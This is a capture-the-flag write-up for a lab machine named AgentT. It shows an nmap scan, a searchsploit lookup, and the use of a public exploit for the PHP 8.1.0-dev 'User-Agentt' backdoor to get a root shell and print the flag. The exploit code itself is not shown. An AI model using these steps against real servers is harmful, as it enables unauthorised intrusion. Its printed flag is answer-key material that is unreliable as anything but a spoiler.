# AgentT

Laurent Chauvin | April 09, 2024

## Resources

[1] https://flast101.github.io/php-8.1.0-dev-backdoor-rce/

## Progress

```
export IP=10.10.208.105
```

Nmap scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.208.105

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 23:03 EDT
Nmap scan report for 10.10.208.105
Host is up (0.087s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds
```

Let's have a look at the website. It seems we're on the admin dashboard. It looks like except for the 404 page and the blank page, links are not working or pages are missing.

When looking at the network traffic when loading the first page (like suggested the hint), we can see this:

```
PHP/8.1.0-dev
```

After a search with searchsploit, we find:

```bash
searchsploit php 8.1.0                   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
autonomous lan party 0.98.1.0 - Remote File Inclusion                                                                                                                                                    | php/webapps/1654.txt
Composr-CMS Version <=10.0.39 - Authenticated Remote Code Execution                                                                                                                                      | php/webapps/51060.txt
Concrete5 CMS 8.1.0 - 'Host' Header Injection                                                                                                                                                            | php/webapps/41885.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration                                                                                                                                                  | php/webapps/44194.py
cPanel < 11.25 - Cross-Site Request Forgery (Add User PHP Script)                                                                                                                                        | php/webapps/17330.html
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                      | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                                                  | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                                                         | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                    | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                                                    | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                                                           | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                                                       | php/webapps/46459.py
FileRun < 2017.09.18 - SQL Injection                                                                                                                                                                     | php/webapps/42922.py
Fozzcom Shopping < 7.94 / < 8.04 - Multiple Vulnerabilities                                                                                                                                              | php/webapps/15571.txt
FreePBX < 13.0.188 - Remote Command Execution (Metasploit)                                                                                                                                               | php/remote/40434.rb
IceWarp Mail Server < 11.1.1 - Directory Traversal                                                                                                                                                       | php/webapps/44587.txt
KACE System Management Appliance (SMA) < 9.0.270 - Multiple Vulnerabilities                                                                                                                              | php/webapps/46956.txt
Kaltura < 13.2.0 - Remote Code Execution                                                                                                                                                                 | php/webapps/43028.py
Kaltura Community Edition < 11.1.0-2 - Multiple Vulnerabilities                                                                                                                                          | php/webapps/39563.txt
Micro Focus Secure Messaging Gateway (SMG) < 471 - Remote Code Execution (Metasploit)                                                                                                                    | php/webapps/45083.rb
Micro Focus Secure Messaging Gateway (SMG) < 471 - Remote Code Execution (Metasploit)                                                                                                                    | php/webapps/45083.rb
NPDS < 08.06 - Multiple Input Validation Vulnerabilities                                                                                                                                                 | php/webapps/32689.txt
OPNsense < 19.1.1 - Cross-Site Scripting                                                                                                                                                                 | php/webapps/46351.txt
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                                                                                      | php/webapps/49933.py
PHP-Nuke 8.1.0.3.5b (Your_Account Module) - Blind SQL Injection (Benchmark Mode)                                                                                                                         | php/webapps/14320.pl
PHP-Nuke 8.1.0.3.5b - 'Downloads' Blind SQL Injection                                                                                                                                                    | php/webapps/18148.pl
PHP-Nuke 8.1.0.3.5b - Remote Command Execution                                                                                                                                                           | php/webapps/14319.pl
Plesk < 9.5.4 - Remote Command Execution                                                                                                                                                                 | php/remote/25986.txt
REDCap < 9.1.2 - Cross-Site Scripting                                                                                                                                                                    | php/webapps/47146.txt
Responsive FileManager < 9.13.4 - Directory Traversal                                                                                                                                                    | php/webapps/45271.txt
Responsive Filemanger <= 9.11.0 - Arbitrary File Disclosure                                                                                                                                              | php/webapps/41272.txt
ScriptCase 8.1.053 - Multiple Vulnerabilities                                                                                                                                                            | php/webapps/40791.txt
ShoreTel Connect ONSITE < 19.49.1500.0 - Multiple Vulnerabilities                                                                                                                                        | php/webapps/46666.txt
Western Digital Arkeia < 10.0.10 - Remote Code Execution (Metasploit)                                                                                                                                    | php/remote/28407.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                                                                      | php/webapps/39553.txt
Zoho ManageEngine ADSelfService Plus 5.7 < 5702 build - Cross-Site Scripting                                                                                                                             | php/webapps/46815.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

Let's focus on `PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution`.

When looking at the exploit `49933.py`, we can see that there is a backdoor in `PHP 8.1.0-dev`. Story can be find here [1]. Let's exploit it then !!

```bash
python3 49933.py                                                                                                                      
Enter the full host url:
http://10.10.208.105                               

Interactive shell is opened on http://10.10.208.105 
Can't acces tty; job crontol turned off.
$ whoami
root
```

Let's look at the root filesystem:

```bash
ls ../../../

bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Let's get the flag:

```bash
$ cat ../../../flag.txt

flag{4127d0530abf16d6d23973e3df8dbecb}
```

## Flag

1. `flag{4127d0530abf16d6d23973e3df8dbecb}`
